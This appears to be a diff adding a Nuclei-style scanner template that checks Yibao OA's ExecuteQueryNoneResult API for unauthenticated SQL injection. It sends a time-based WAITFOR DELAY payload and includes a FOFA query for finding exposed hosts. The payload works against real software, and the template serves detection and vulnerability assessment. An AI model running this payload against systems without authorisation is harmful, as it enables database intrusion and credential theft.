@@ -1,0 +1,36 @@
+id: yibao-executequerynoneresult-sqli
+
+info:
+  name: Yibao OA ExecuteQueryNoneResult - SQL Injection
+  author: qwtd
+  severity: high
+  description: 易宝OA ExecuteQueryNoneResult接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E5%AE%9DOA/%E6%98%93%E5%AE%9DOA-ExecuteQueryNoneResult%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="顶讯科技-易宝OA系统"
+  tags: 易宝OA
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        
+        token=zxh&cmdText=;WAITFOR DELAY '0:0:6'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'is_succeed'
+      - type: dsl
+        dsl:
+          - "duration>=6" # Checks if the response took more than 6 seconds
